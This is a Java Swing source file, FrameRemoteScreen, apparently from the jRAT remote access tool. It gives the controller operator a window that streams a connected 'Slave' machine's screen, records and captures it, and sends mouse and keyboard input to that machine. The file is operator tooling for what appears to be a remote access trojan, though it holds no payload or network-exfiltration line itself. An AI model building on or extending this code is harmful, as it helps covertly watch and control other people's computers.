package se.jrat.controller.ui.frames;

import iconlib.IconUtils;

import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.MouseMotionAdapter;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.image.BufferedImage;
import java.io.File;
import java.util.HashMap;
import java.util.Map;

import javax.imageio.ImageIO;
import javax.swing.DefaultComboBoxModel;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JProgressBar;
import javax.swing.JSlider;
import javax.swing.JToggleButton;
import javax.swing.JToolBar;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;

import se.jrat.common.utils.DataUnits;
import se.jrat.controller.ErrorDialog;
import se.jrat.controller.Slave;
import se.jrat.controller.packets.outgoing.Packet12RemoteScreen;
import se.jrat.controller.packets.outgoing.Packet26StopRemoteScreen;
import se.jrat.controller.packets.outgoing.Packet91MouseMove;
import se.jrat.controller.packets.outgoing.Packet92MousePress;
import se.jrat.controller.packets.outgoing.Packet93MouseRelease;
import se.jrat.controller.packets.outgoing.Packet94KeyPress;
import se.jrat.controller.packets.outgoing.Packet95KeyRelease;
import se.jrat.controller.threads.ThreadFPS;
import se.jrat.controller.threads.ThreadRecordButton;
import se.jrat.controller.ui.components.JRemoteScreenPane;
import se.jrat.controller.ui.dialogs.DialogMonitors;
import se.jrat.controller.ui.dialogs.DialogRecordRemoteScreen;
import se.jrat.controller.ui.renderers.JComboBoxIconRenderer;

import com.redpois0n.graphs.monitors.RemoteMonitor;


@SuppressWarnings("serial")
public class FrameRemoteScreen extends BaseFrame {
	
	public static final Map<Slave, FrameRemoteScreen> INSTANCES = new HashMap<Slave, FrameRemoteScreen>();
	public static final ImageIcon DEFAULT_RECORD_ICON = IconUtils.getIcon("camera-black");
	
	private BufferedImage buffer;
	
	private int transmitted;
	private int chunks;
	
	private int monitor;
	private int quality;
	private int interval;
	private int size;
	private ThreadFPS threadFps = new ThreadFPS() {
		public void onUpdate(int fps) {
			lblFps.setText("    FPS: " + fps + "    ");
		}
	};
	private DialogRecordRemoteScreen recordFrame = new DialogRecordRemoteScreen(this);
	
	private JToolBar toolBarTop;
	private JToolBar toolBarBottom;
	private JRemoteScreenPane screenPane;
	private JProgressBar progressBar;
	private JButton btnStart;
	private JButton btnStop;
	private JLabel lblFps;
	private JButton btnCapture;
	private JButton btnRecord;
	private ThreadRecordButton threadRecordButton;
	private JSlider sliderSize;
	private JLabel lblSize;
	private JToggleButton tglbtnToggleMouse;
	private JToggleButton tglbtnToggleKeyboard;
	private JToggleButton tglbtnToggleMovement;
	private JComboBox<String> cbMonitors;
	private JLabel lblMonitor;
	private JLabel lblQuality;
	private JSlider sliderQuality;
	private JLabel lblBlockSize;
	private JLabel lblChunks;

	public FrameRemoteScreen(Slave sl) {
		super(sl);
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				exit();
			}
		});
		slave = sl;
		threadFps.start();
		
		setTitle("Remote Screen");
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteScreen.class.getResource("/icons/screen.png")));
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 673, 446);
		
		INSTANCES.put(sl, this);
		
		toolBarTop = new JToolBar();
		toolBarTop.setFloatable(false);
		
		toolBarBottom = new JToolBar();
		toolBarBottom.setFloatable(false);
		
		screenPane = new JRemoteScreenPane();
		screenPane.getPanel().addKeyListener(new KeyAdapter() {
			@Override
			public void keyPressed(KeyEvent e) {
				slave.addToSendQueue(new Packet94KeyPress(e.getKeyCode()));
			}
			
			@Override
			public void keyReleased(KeyEvent e) {
				slave.addToSendQueue(new Packet95KeyRelease(e.getKeyCode()));
			}
			
			@Override
			public void keyTyped(KeyEvent e) {
				
			}
		});
		screenPane.getPanel().addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				if (tglbtnToggleMouse.isSelected()) {
					slave.addToSendQueue(new Packet91MouseMove((int) (e.getX() / (size / 100D)), (int) (e.getY() / (size / 100D)), monitor));

					int button = e.getButton();
					int button2 = 16;
					if (button == 3) {
						button2 = 4;
					}

					slave.addToSendQueue(new Packet92MousePress((int) (e.getX() / (size / 100D)), (int) (e.getY() / (size / 100D)), button2, monitor));
				}
			}

			@Override
			public void mouseReleased(MouseEvent e) {
				if (tglbtnToggleMouse.isSelected()) {
					int button = e.getButton();
					int button2 = 16;
					if (button == 3) {
						button2 = 4;
					}

					slave.addToSendQueue(new Packet93MouseRelease((int) (e.getX() / (size / 100D)), (int) (e.getY() / (size / 100D)), button2, monitor));
				}
			}
		});
		
		screenPane.getPanel().addMouseMotionListener(new MouseMotionAdapter() {
			@Override
			public void mouseMoved(MouseEvent e) {
				if (tglbtnToggleMovement.isSelected()) {
					slave.addToSendQueue(new Packet91MouseMove((int) (e.getX() / (size / 100D)), (int) (e.getY() / (size / 100D)), monitor));
				}
			}
		});
		
		progressBar = new JProgressBar();
		toolBarBottom.add(progressBar);
		toolBarBottom.addSeparator();
		
		lblMonitor = new JLabel("Monitor:  ");
		lblMonitor.setIcon(IconUtils.getIcon("monitor"));
		toolBarBottom.add(lblMonitor);
		
		cbMonitors = new JComboBox<String>();
		cbMonitors.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				monitor = cbMonitors.getSelectedIndex() - 1;
				sendUpdate();
			}
		});
		DefaultComboBoxModel<String> model = new DefaultComboBoxModel<String>();
		cbMonitors.setModel(model);
		JComboBoxIconRenderer renderer = new JComboBoxIconRenderer();
		cbMonitors.setRenderer(renderer);
		model.removeAllElements();
		model.addElement("Default");
		renderer.addIcon("default", IconUtils.getIcon("monitor-arrow"));

		ImageIcon icon = IconUtils.getIcon("monitor");

		for (RemoteMonitor monitor : slave.getMonitors()) {
			renderer.addIcon(monitor.getLabel(), icon);
			model.addElement(monitor.getLabel());
		}
		
		toolBarBottom.add(cbMonitors);
		toolBarBottom.addSeparator();
		
		lblFps = new JLabel("    FPS: 0    ");
		toolBarBottom.add(lblFps);
		
		lblBlockSize = new JLabel("Block Size: 0 B");
		toolBarBottom.add(lblBlockSize);
		
		lblChunks = new JLabel("   Chunks: ");
		toolBarBottom.add(lblChunks);
		
		btnStart = new JButton("");
		btnStart.setToolTipText("Start");
		btnStart.setIcon(IconUtils.getIcon("start"));
		btnStart.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				start();
			}
		});
		toolBarTop.add(btnStart);
		
		btnStop = new JButton("");
		btnStop.setToolTipText("Stop");
		btnStop.setIcon(IconUtils.getIcon("stop"));
		btnStop.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				stop();
			}
		});
		btnStop.setEnabled(false);
		toolBarTop.add(btnStop);
		
		toolBarTop.addSeparator();
		
		btnCapture = new JButton("");
		btnCapture.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				capture();
			}
		});
		btnCapture.setToolTipText("Capture");
		btnCapture.setIcon(DEFAULT_RECORD_ICON);
		toolBarTop.add(btnCapture);
		
		btnRecord = new JButton("");
		btnRecord.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				recordFrame.setVisible(true);
			}
		});
		btnRecord.setIcon(IconUtils.getIcon("record"));
		btnRecord.setToolTipText("Record");
		threadRecordButton = new ThreadRecordButton(btnRecord);
		
		toolBarTop.add(btnRecord);
		toolBarTop.addSeparator();
		
		lblSize = new JLabel("Size: " + size + "%");
		lblSize.setIcon(IconUtils.getIcon("application-resize"));
		toolBarTop.add(lblSize);
		
		sliderSize = new JSlider();
		sliderSize.addChangeListener(new ChangeListener() {
			public void stateChanged(ChangeEvent arg0) {
				setImageSize(sliderSize.getValue());
				sendUpdate();
			}
		});
		sliderSize.setToolTipText("Size");
		sliderSize.setSnapToTicks(true);
		toolBarTop.add(sliderSize);
		toolBarTop.addSeparator();
		
		lblQuality = new JLabel("Quality: " + quality);
		toolBarTop.add(lblQuality);
		lblQuality.setIcon(IconUtils.getIcon("monitor-plus"));
		
		sliderQuality = new JSlider();
		sliderQuality.addChangeListener(new ChangeListener() {
			public void stateChanged(ChangeEvent arg0) {
				setQuality(sliderQuality.getValue());
				sendUpdate();
			}
		});
		toolBarTop.add(sliderQuality);
		sliderQuality.setValue(5);
		sliderQuality.setSnapToTicks(true);
		sliderQuality.setMinorTickSpacing(1);
		sliderQuality.setMaximum(10);
		
		tglbtnToggleMouse = new JToggleButton("");
		tglbtnToggleMouse.setSelected(true);
		tglbtnToggleMouse.setIcon(IconUtils.getIcon("mouse"));
		toolBarTop.add(tglbtnToggleMouse);
		
		tglbtnToggleKeyboard = new JToggleButton("");
		tglbtnToggleKeyboard.setSelected(true);
		tglbtnToggleKeyboard.setIcon(IconUtils.getIcon("keyboard"));
		toolBarTop.add(tglbtnToggleKeyboard);
		
		tglbtnToggleMovement = new JToggleButton("");
		tglbtnToggleMovement.setIcon(IconUtils.getIcon("arrow-move"));
		toolBarTop.add(tglbtnToggleMovement);
		
		toolBarTop.addSeparator();
		GroupLayout groupLayout = new GroupLayout(getContentPane());
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addComponent(toolBarTop, GroupLayout.PREFERRED_SIZE, 657, GroupLayout.PREFERRED_SIZE)
				.addComponent(screenPane, GroupLayout.DEFAULT_SIZE, 657, Short.MAX_VALUE)
				.addComponent(toolBarBottom, GroupLayout.PREFERRED_SIZE, 657, GroupLayout.PREFERRED_SIZE)
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addComponent(toolBarTop, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
					.addComponent(screenPane, GroupLayout.DEFAULT_SIZE, 357, Short.MAX_VALUE)
					.addComponent(toolBarBottom, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
		);
		getContentPane().setLayout(groupLayout);
	}
	
	public void sendUpdate() {
		buffer = null;
	}

	public void start() {
		btnStart.setEnabled(false);
		btnStop.setEnabled(true);
			
		slave.addToSendQueue(new Packet12RemoteScreen(size, quality, monitor, getColumns(), getRows()));
	}
	
	public void stop() {
		btnStart.setEnabled(true);
		btnStop.setEnabled(false);
		
		transmitted = 0;
		slave.addToSendQueue(new Packet26StopRemoteScreen());
	}
	
	public void exit() {
		INSTANCES.remove(slave);
		threadFps.stopRunning();
		
		slave.addToSendQueue(new Packet26StopRemoteScreen());
	}
	
	public void capture() {
		BufferedImage image = screenPane.getPanel().getImage();
		
		JFileChooser c = new JFileChooser();
		c.showOpenDialog(null);
		File f = c.getSelectedFile();
		
		if (f != null) {
			try {
				ImageIO.write(image, "png", f);
			} catch (Exception e) {
				ErrorDialog.create(e);
				e.printStackTrace();
			}
		}
	}
	
	public void drawOverlay(BufferedImage image) {
		screenPane.update(image);
		threadFps.increase();
		
		if (recordFrame.isRecording()) {
			recordFrame.update(image);
		}
	}
	
	public void update(BufferedImage image) {
		screenPane.update(image);
	}

	public static void show(Slave sl) {
		FrameRemoteScreen frame = new FrameRemoteScreen(sl);
		frame.setVisible(true);
		
		if (sl.getMonitors().length == 1) {
			DialogMonitors dialog = new DialogMonitors(frame, sl);
			dialog.setVisible(true);
		}
	}

	public int getMonitor() {
		return monitor;
	}

	public void setMonitor(int monitor) {
		this.monitor = monitor;
	}

	public int getQuality() {
		return quality;
	}

	public void setQuality(int quality) {
		this.quality = quality;
		lblQuality.setText("Quality: " + quality);
	}

	public int getInterval() {
		return interval;
	}

	public void setInterval(int interval) {
		this.interval = interval;
	}

	public int getImageSize() {
		return size;
	}

	public void setImageSize(int size) {
		this.size = size;
		buffer = null;
		lblSize.setText("Size: " + size + "%");
	}
	
	public ThreadFPS getFPSThread() {
		return threadFps;
	}

	public JProgressBar getProgressBar() {
		return progressBar;
	}

	public ThreadRecordButton getThreadRecordButton() {
		return threadRecordButton;
	}

	public void setThreadRecordButton(ThreadRecordButton threadRecordButton) {
		this.threadRecordButton = threadRecordButton;
	}

	public Slave getSlave() {
		return slave;
	}

	public JButton getRecordButton() {
		return btnRecord;
	}

	public JSlider getSliderSize() {
		return sliderSize;
	}

	public JComboBox<String> getCbMonitors() {
		return cbMonitors;
	}

	public JSlider getSliderQuality() {
		return sliderQuality;
	}
	
	public boolean isRunning() {
		return btnStop.isEnabled();
	}

	public BufferedImage getBuffer() {
		return buffer;
	}

	public void setBuffer(BufferedImage buffer) {
		this.buffer = buffer;
	}
	
	public int getColumns() {
		return 4;
	}
	
	public int getRows() {
		return 4;
	}

	public int getTransmitted() {
		return transmitted;
	}

	public void setTransmitted(int transmitted) {
		this.transmitted = transmitted;
	}
	
	public void setBlockSizeLabel(int b) {
		lblBlockSize.setText("Block Size: " + DataUnits.getAsString((long) b));
	}

	public int getChunks() {
		return chunks;
	}

	public void setChunks(int chunks) {
		this.chunks = chunks;
	}
	
	public void setChunksLabel(int chunks) {
		lblChunks.setText("   Chunks: " + chunks);
	}

}
